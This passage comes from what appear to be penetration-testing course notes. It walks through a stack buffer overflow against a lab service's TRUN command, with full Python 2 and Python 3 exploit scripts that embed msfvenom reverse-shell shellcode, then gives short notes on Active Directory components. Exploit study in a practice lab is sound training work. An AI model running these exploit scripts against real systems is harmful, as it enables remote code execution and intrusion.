</code></pre><blockquote id="94cfcfd4-4083-4b5b-b40e-6c0af0643175" class="">Here we can identifie the 04 05 are out of place, in this case the badchar is 04 the 05 value is just corrupted by the 04 char</blockquote><h2 id="64e0ce44-8127-4f3b-a079-c496f4c557ac" class=""><strong>Finding the right module</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#finding-the-right-module"></a></strong></h2><p id="4f7d4830-d301-4e7c-b190-24b6c0410040" class="">Here we are looking for DLL or something similar that has no memory protection</p><p id="83bdbfbd-7f5e-4ea7-aa88-d4da51e3b569" class="">→ https://github.com/corelan/mona</p><p id="a63c6b90-0f5f-4957-8cbc-4087ee379990" class="">Copy mona.py to ‘C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</p><p id="53644bb0-c46d-4641-82fc-5b447c917e21" class="">in Immunity Debugger type:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a36e3b87-e0b2-4758-b822-e9ff2862c765" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">!mona modules
</code></pre><blockquote id="2c4dbc26-d3ba-464f-bb31-6a9e6c378e0e" class="">Here we have to choose a module without protection that have relation with the program we are attacking</blockquote><p id="62326fdc-c586-4727-b1bc-3e0870a02f46" class="">in kali:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="94b0fa9b-41e8-42bb-b925-20cef3030d2d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

nasm &gt; JMP ESP
00000000  FFE4  jmp esp
</code></pre><h3 id="b15cf57f-cc90-4afc-8a66-861ff26fec7f" class=""><strong>Take the value - In this case FFE4</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#take-the-value---in-this-case-ffe4"></a></strong></h3><p id="aeb67cd6-5a57-4e78-9cc0-31214655fd0e" class="">in ImuDeb:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a565347d-939c-4308-9186-453e7b1b6eff" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll
</code></pre><ul id="e56907b2-44b1-4328-bd34-11ed73cebb5d" class="bulleted-list"><li style="list-style-type:disc">The result is gonna be to show us the pointers</li></ul><ul id="20c68708-6259-40b8-b4ab-0cf64e43d103" class="bulleted-list"><li style="list-style-type:disc">We choose a pointer starting from the top</li></ul><p id="97749e69-841d-4b31-a996-cae6f354f6d9" class="">In this case: 0x625011af</p><p id="a822a134-698d-4f52-b05d-e4826a8f93dc" class="">We need to reverse this pointer value like this:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="341e81e1-f9c4-445f-9dd2-e3b0f9560e77" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&#x27;0x625011af&#x27; &gt;&gt; &#x27;\xaf\x11\x50\x62&#x27;
</code></pre><ul id="1399a782-ec5c-4a80-9502-daecd1a9c28c" class="bulleted-list"><li style="list-style-type:disc">because x86 architectures read the lower order address first, thats why its in reverse</li></ul><p id="69df3b99-d77a-486c-b2e0-3d80588ada19" class="">Python updated:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9bbcd216-a70a-4bd0-bf9e-02f9d944a0f5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python

import sys, socket

offset = 2003
# eip = &quot;B&quot; * 4
pointer = &quot;\xaf\x11\x50\x62&quot;
shellcode = &quot;A&quot; * offset + pointer #+ eip

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect((&#x27;172.16.127.128&#x27;,9999))
  s.send((&#x27;TRUN /.:/&#x27; + shellcode))
  s.close()
except:
  print &quot;Error connecting to server&quot;
  sys.exit()

</code></pre><h3 id="7a3fb810-b336-45ad-9cac-cb17de0a6fe2" class=""><strong>In Immunity</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#in-immunity"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="02a96f58-b351-45c4-8a96-f5727a017789" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Go to a blue arrow &gt; &#x27;go to address in disassembler&#x27;
Type the address &gt; in this case: &#x27;625011af&#x27;
should appear the JMP ESP FFE4
press &#x27;F2&#x27; to set a breakpoint in the address we wanna modify and run the script
</code></pre><blockquote id="aef322c3-c7d8-460f-9184-b0774e13730d" class="">This should break the application again and the value of EIP should be the same as our address 625011af</blockquote><h2 id="daac3faf-36f2-4e18-92a2-49bdd73a0019" class=""><strong>Generating Shellcode and Gaining Root</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#generating-shellcode-and-gaining-root"></a></strong></h2><h3 id="5406fc87-a185-4130-a019-c487b4a3bb6d" class=""><strong>Creating the reverse shell payload</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#creating-the-reverse-shell-payload"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="abaf2a87-b00e-4e82-95b0-8bd84dfbd080" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;our ip&gt; LPORT=&lt;port&gt; EXITFUNC=thread -f c -a x86 -b &quot;\x00&quot;

# -p = payload
# EXITFUNC = let our payload more stable
# -f = file type
# -a = architecture
# -b = badchars that we found during the process, in this case none so we add only the default
</code></pre><ul id="031fbe3d-33fb-4533-bc0d-78bc6a51a285" class="bulleted-list"><li style="list-style-type:disc">always note the payload size, could be important</li></ul><ul id="55bb80fb-5244-4628-8f7f-2e1511156b2c" class="bulleted-list"><li style="list-style-type:disc">copy the payload (between parenteses) to our last script</li></ul><ul id="b1dffa17-2df7-4ea7-99f2-3cd4a36c171d" class="bulleted-list"><li style="list-style-type:disc">moreover, we need to add a padding/NOP (no operational) space before the overflow payload</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c331bee9-cd2c-4f90-b7e2-ecc7f5643895" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python
import sys, socket

offset = &quot;A&quot; * 2003
pointer = &quot;\xaf\x11\x50\x62&quot;
overflow = (&quot;\xb8\x1e\x4c\x2e\xcc\xd9\xc9\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1&quot;
&quot;\x52\x31\x47\x12\x03\x47\x12\x83\xd9\x48\xcc\x39\x19\xb8\x92&quot;
&quot;\xc2\xe1\x39\xf3\x4b\x04\x08\x33\x2f\x4d\x3b\x83\x3b\x03\xb0&quot;
&quot;\x68\x69\xb7\x43\x1c\xa6\xb8\xe4\xab\x90\xf7\xf5\x80\xe1\x96&quot;
&quot;\x75\xdb\x35\x78\x47\x14\x48\x79\x80\x49\xa1\x2b\x59\x05\x14&quot;
&quot;\xdb\xee\x53\xa5\x50\xbc\x72\xad\x85\x75\x74\x9c\x18\x0d\x2f&quot;
&quot;\x3e\x9b\xc2\x5b\x77\x83\x07\x61\xc1\x38\xf3\x1d\xd0\xe8\xcd&quot;
&quot;\xde\x7f\xd5\xe1\x2c\x81\x12\xc5\xce\xf4\x6a\x35\x72\x0f\xa9&quot;
&quot;\x47\xa8\x9a\x29\xef\x3b\x3c\x95\x11\xef\xdb\x5e\x1d\x44\xaf&quot;
&quot;\x38\x02\x5b\x7c\x33\x3e\xd0\x83\x93\xb6\xa2\xa7\x37\x92\x71&quot;
&quot;\xc9\x6e\x7e\xd7\xf6\x70\x21\x88\x52\xfb\xcc\xdd\xee\xa6\x98&quot;
&quot;\x12\xc3\x58\x59\x3d\x54\x2b\x6b\xe2\xce\xa3\xc7\x6b\xc9\x34&quot;
&quot;\x27\x46\xad\xaa\xd6\x69\xce\xe3\x1c\x3d\x9e\x9b\xb5\x3e\x75&quot;
&quot;\x5b\x39\xeb\xda\x0b\x95\x44\x9b\xfb\x55\x35\x73\x11\x5a\x6a&quot;
&quot;\x63\x1a\xb0\x03\x0e\xe1\x53\xec\x67\xe9\xa8\x84\x75\xe9\xbf&quot;
&quot;\x08\xf3\x0f\xd5\xa0\x55\x98\x42\x58\xfc\x52\xf2\xa5\x2a\x1f&quot;
&quot;\x34\x2d\xd9\xe0\xfb\xc6\x94\xf2\x6c\x27\xe3\xa8\x3b\x38\xd9&quot;
&quot;\xc4\xa0\xab\x86\x14\xae\xd7\x10\x43\xe7\x26\x69\x01\x15\x10&quot;
&quot;\xc3\x37\xe4\xc4\x2c\xf3\x33\x35\xb2\xfa\xb6\x01\x90\xec\x0e&quot;
&quot;\x89\x9c\x58\xdf\xdc\x4a\x36\x99\xb6\x3c\xe0\x73\x64\x97\x64&quot;
&quot;\x05\x46\x28\xf2\x0a\x83\xde\x1a\xba\x7a\xa7\x25\x73\xeb\x2f&quot;
&quot;\x5e\x69\x8b\xd0\xb5\x29\xab\x32\x1f\x44\x44\xeb\xca\xe5\x09&quot;
&quot;\x0c\x21\x29\x34\x8f\xc3\xd2\xc3\x8f\xa6\xd7\x88\x17\x5b\xaa&quot;
&quot;\x81\xfd\x5b\x19\xa1\xd7&quot;)

padding = &quot;\x90&quot; * 20

shellcode = offset + pointer + padding + overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((&#x27;172.16.127.128&#x27;,9999))
	s.send((&#x27;TRUN /.:/&#x27; + shellcode))
	s.close()
except:
	print &quot;Error connecting to server&quot;
	sys.exit()

</code></pre><blockquote id="b3128280-bda9-44cd-b3a3-ca29305f6ef8" class="">set netcat and run the exploit we have root</blockquote><h2 id="6fe88296-669e-4d1d-8d04-dd3fc8a654c1" class=""><strong>Exploit Development Using Python3 and Mona</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#exploit-development-using-python3-and-mona"></a></strong></h2><p id="73e87afb-bbc5-4c4a-b5a6-e6b507e44080" class="">in immunity:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="abb2a496-d7e2-4046-adad-5abd51a84833" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">!mona config -set workingfolder c:\mona
!mona bytearray -cpb &quot;\x00\x0a&quot;
!mona compare -f c:\mona\bytearray.bin -a &lt;ESP&gt;

!mona jmp -r ESP -m &quot;essfunc.dll&quot;
</code></pre><p id="ee9d2c64-8838-4361-8022-52d9685cffd4" class="">ESP 015919F8</p><ul id="53e7674e-793b-4f6e-9cdc-99b1fa00bea2" class="bulleted-list"><li style="list-style-type:disc">A couple of changes using python3</li></ul><ul id="4ddaefe2-a1b4-4def-a4cb-234566a7efa5" class="bulleted-list"><li style="list-style-type:disc">example print(“”) with parenteses and payload should be encoded</li></ul><ul id="d9311c9c-7f17-40e1-b52f-c81101ac0801" class="bulleted-list"><li style="list-style-type:disc">every input should be byte encoded like b(“\x00\x01”)</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6f61fc50-6b39-431a-bc15-cdcb4b1e3898" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python3
import sys, socket

offset = b&quot;A&quot; * 2003
pointer = b&quot;\xaf\x11\x50\x62&quot;
overflow = (b&quot;\xb8\x1e\x4c\x2e\xcc\xd9\xc9\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1&quot;
b&quot;\x52\x31\x47\x12\x03\x47\x12\x83\xd9\x48\xcc\x39\x19\xb8\x92&quot;
b&quot;\xc2\xe1\x39\xf3\x4b\x04\x08\x33\x2f\x4d\x3b\x83\x3b\x03\xb0&quot;
b&quot;\x68\x69\xb7\x43\x1c\xa6\xb8\xe4\xab\x90\xf7\xf5\x80\xe1\x96&quot;
b&quot;\x75\xdb\x35\x78\x47\x14\x48\x79\x80\x49\xa1\x2b\x59\x05\x14&quot;
b&quot;\xdb\xee\x53\xa5\x50\xbc\x72\xad\x85\x75\x74\x9c\x18\x0d\x2f&quot;
b&quot;\x3e\x9b\xc2\x5b\x77\x83\x07\x61\xc1\x38\xf3\x1d\xd0\xe8\xcd&quot;
b&quot;\xde\x7f\xd5\xe1\x2c\x81\x12\xc5\xce\xf4\x6a\x35\x72\x0f\xa9&quot;
b&quot;\x47\xa8\x9a\x29\xef\x3b\x3c\x95\x11\xef\xdb\x5e\x1d\x44\xaf&quot;
b&quot;\x38\x02\x5b\x7c\x33\x3e\xd0\x83\x93\xb6\xa2\xa7\x37\x92\x71&quot;
b&quot;\xc9\x6e\x7e\xd7\xf6\x70\x21\x88\x52\xfb\xcc\xdd\xee\xa6\x98&quot;
b&quot;\x12\xc3\x58\x59\x3d\x54\x2b\x6b\xe2\xce\xa3\xc7\x6b\xc9\x34&quot;
b&quot;\x27\x46\xad\xaa\xd6\x69\xce\xe3\x1c\x3d\x9e\x9b\xb5\x3e\x75&quot;
b&quot;\x5b\x39\xeb\xda\x0b\x95\x44\x9b\xfb\x55\x35\x73\x11\x5a\x6a&quot;
b&quot;\x63\x1a\xb0\x03\x0e\xe1\x53\xec\x67\xe9\xa8\x84\x75\xe9\xbf&quot;
b&quot;\x08\xf3\x0f\xd5\xa0\x55\x98\x42\x58\xfc\x52\xf2\xa5\x2a\x1f&quot;
b&quot;\x34\x2d\xd9\xe0\xfb\xc6\x94\xf2\x6c\x27\xe3\xa8\x3b\x38\xd9&quot;
b&quot;\xc4\xa0\xab\x86\x14\xae\xd7\x10\x43\xe7\x26\x69\x01\x15\x10&quot;
b&quot;\xc3\x37\xe4\xc4\x2c\xf3\x33\x35\xb2\xfa\xb6\x01\x90\xec\x0e&quot;
b&quot;\x89\x9c\x58\xdf\xdc\x4a\x36\x99\xb6\x3c\xe0\x73\x64\x97\x64&quot;
b&quot;\x05\x46\x28\xf2\x0a\x83\xde\x1a\xba\x7a\xa7\x25\x73\xeb\x2f&quot;
b&quot;\x5e\x69\x8b\xd0\xb5\x29\xab\x32\x1f\x44\x44\xeb\xca\xe5\x09&quot;
b&quot;\x0c\x21\x29\x34\x8f\xc3\xd2\xc3\x8f\xa6\xd7\x88\x17\x5b\xaa&quot;
b&quot;\x81\xfd\x5b\x19\xa1\xd7&quot;)

padding = b&quot;\x90&quot; * 20

shellcode = offset + pointer + padding + overflow

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect((&#x27;172.16.127.128&#x27;,9999))
  payload = b&quot;TRUN /.:/&quot; + shellcode

# we could use payload.encode, but sometimes the payload does not work
# thats why we are byte encoding manually every input

  s.send((payload))
  s.close()
except:
  print(&quot;Error connecting to server&quot;)
  sys.exit()

</code></pre><h1 id="938d9eb4-727e-4a73-bfa4-07aa5b4635cc" class=""><strong>AD</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#ad"></a></strong></h1><p id="5d7be68b-9f92-4193-97a8-4094c3dff919" class="">Authenticates using Kerberos tickets:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0cbe0c6a-8212-45e8-a8a5-7b08760783e4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">non-Windows devices, such as Linux machines, firewalls, etc.
Can also authenticate to AD via RADIUS or LDAP
</code></pre><h2 id="1ae76a3c-17e0-46de-93d4-83cec728b9b6" class=""><strong>Physical AD Components</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#physical-ad-components"></a></strong></h2><h3 id="5c6d371e-a61f-4954-8738-dfeb507d0ac4" class=""><strong>Domain Controller</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#domain-controller"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="f1bfc892-0608-47f6-87f0-9a3287f2f437" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Host a copy of the AD DS directory store
Provide authentication and authorization services
Replicate updates to other domain controllers in the domain and forest
Allow administrative access to manage user accounts and network resources
</code></pre><h3 id="ea68c40f-4d47-4f26-96eb-439f11a9ccbd" class=""><strong>The AD DS data store</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#the-ad-ds-data-store"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7ef23abc-3e0e-4397-aa14-a903ab8be1ee" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Consists of the Ntds.dit file
Is stored by default in the %SystemRoot%\NTDS folder on all domain controllers
Is accessible only through the domain controller processes and protocols
</code></pre><h2 id="e42f3f0e-df37-4bfe-99ae-df71a2ffcc7e" class=""><strong>Logical AD Components</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#logical-ad-components"></a></strong></h2><h3 id="5001369a-aa5b-4a99-8fc5-f876a34603f7" class=""><strong>AD DS Schema</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#ad-ds-schema"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1cc7463a-cc62-42ba-925c-67bfa4ea1219" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Enforces rules regarding object creation and configuration
</code></pre><h3 id="d31cd32a-8bf6-43ee-9eeb-74ebcbc56730" class=""><strong>Domain</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#domain"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e290f7e5-b5b2-4245-86a3-c586691c4f78" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Used to group and manage objects in an organization
</code></pre><h3 id="24c09308-6f9a-4a8f-8ab1-0efe9d7fe21e" class=""><strong>Trees</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#trees"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="120cd045-cd84-436a-94ba-77eb7c4aa51d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Hierarchy of domains in AD DS
Share a contiguous namespace with the parent domain
Can have additional child domains
</code></pre><h3 id="fae48392-68a7-45a0-afeb-8bc37dea3577" class=""><strong>Forest</strong><strong><a href="https://johnermac.github.io/notes/pnpt/peh/#forest"></a></strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="68f6cffb-3f49-4552-a757-a6d683cfee92" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Collection of one or more trees
Share a common schema
Share the enterprise Admins and Schema Admins groups
